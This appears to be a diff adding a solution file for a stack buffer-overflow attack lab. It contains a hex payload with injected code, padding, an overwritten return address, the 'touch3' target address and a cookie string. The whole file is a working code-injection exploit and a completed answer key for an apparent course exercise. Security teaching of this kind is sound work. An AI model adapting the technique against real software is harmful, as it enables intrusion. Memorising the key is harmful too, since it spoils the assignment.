@@ -1,0 +1,16 @@
+/* Moving address 0x556704b0 having string representation of cookie*/
+48 c7 c7 b0 04 67 55 c3
+
+/*filling up buffer*/
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+
+/*Over writing return address*/ 
+78 04 67 55 00 00 00 00
+
+/*Address of touch3*/
+7c 19 40 00 00 00 00 00
+
+/*String representation of cookie*/
+35 43 42 36 31 45 46 31
